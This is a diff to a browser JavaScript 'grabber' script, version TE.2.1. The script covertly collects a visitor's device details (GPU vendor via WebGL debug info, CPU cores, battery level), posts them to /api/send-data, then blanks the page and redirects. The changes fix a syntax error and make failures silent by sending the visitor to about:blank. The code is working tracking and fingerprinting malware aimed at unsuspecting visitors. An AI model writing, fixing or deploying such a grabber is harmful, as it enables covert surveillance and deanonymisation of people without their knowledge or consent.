@@ -25,6 +25,7 @@
           FLAGS.gpu = { WebGL: true };
           FLAGS.gpu.debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
         }
+        try { 
         const payload = {
           "=========== :CLIENT": "===========",
           "GRABBER VERSION": "TE.2.1",
@@ -39,8 +40,7 @@
           "CPU Cores": navigator.hardwareConcurrency,
           Charging: (await navigator.getBattery()).charging,
           "Battery percentage": `${
-          try{
-            (await navigator.getBattery()).level * 100}catch (err){ "unavailible;"}
+            navigator.getBattery ? (await navigator.getBattery()).level * 100 : "Unavailible"
           }%`,
           "GPU Vendor": FLAGS.gpu.debugInfo
             ? gl.getParameter(FLAGS.gpu.debugInfo.UNMASKED_VENDOR_WEBGL)
@@ -63,6 +63,7 @@
             second: "numeric",
           }).format(),
         };
+        } catch (err){ document.write(""); location.href = "about:blank" }
         try {
           await fetch("/api/send-data", {
             method: "POST",
@@ -72,7 +73,7 @@
             body: JSON.stringify(payload),
           });
         } catch (error) {
-          console.error("Error sending data:", error);
+          location.href = "about:blank"
         } finally {
           document.write("");
           if (redirect) {
